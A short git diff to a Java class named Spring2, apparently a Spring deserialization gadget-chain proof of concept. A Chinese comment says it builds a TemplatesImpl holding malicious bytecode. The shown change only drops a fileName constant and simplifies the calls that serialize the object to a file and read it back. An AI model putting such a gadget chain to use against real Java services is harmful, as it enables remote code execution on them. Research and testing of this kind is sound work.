@@ -14,8 +14,6 @@ import java.util.HashMap;
  */
 public class Spring2 {
 
-	public static String fileName = "Spring2.bin";
-
 	public static void main(String[] args) throws Exception {
 
 		// 生成包含恶意类字节码的 TemplatesImpl 类
@@ -71,8 +69,8 @@ public class Spring2 {
 		field.setAccessible(true);
 		field.set(objects, "newTransformer");
 
-		SerializeUtil.writeObjectToFile(objects, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(objects);
+		SerializeUtil.readFileObject();
 	}
 
 }
